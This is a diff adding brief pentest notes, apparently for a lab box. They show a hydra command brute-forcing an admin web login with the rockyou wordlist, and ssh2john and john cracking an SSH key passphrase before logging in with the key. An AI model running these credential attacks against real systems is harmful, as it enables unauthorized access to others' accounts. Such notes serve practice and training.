@@ -1,0 +1,14 @@
+for hydra bruteforce web login:
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.78.111 http-post-form \
+"/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
+
+
+for john2ssh :
+
+python3 /usr/share/john/ssh2john.py sshkey >sshkey.hash
+
+john --wordlists=#PATH# sshkey.hash
+
+ssh -i sshkey user@IP
+
